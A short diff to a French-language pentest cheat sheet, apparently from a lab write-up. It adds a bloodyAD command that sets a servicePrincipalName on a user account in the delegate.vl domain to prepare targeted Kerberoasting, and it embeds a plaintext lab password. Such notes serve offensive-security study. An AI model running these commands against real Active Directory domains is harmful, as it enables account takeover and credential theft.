@@ -11,3 +11,9 @@ bloodyad -u <USER> -p <PASS> -d <DOMAIN-NAME> --host <IP-DC> add groupMember 'se
 
 [+] p.agila added to service accounts
 ```
+
+### Ajouter un SPN au compte pour futur Keroasting
+```bash
+# Ajout d'un SPN pour le compte de N.Thompspn  
+bloodyad -d delegate.vl  -u 'A.Briggs' -p 'P4ssw0rd1#123' --host 10.129.234.69 set object N.Thompson servicePrincipalName -v 'http:/anything'
+```
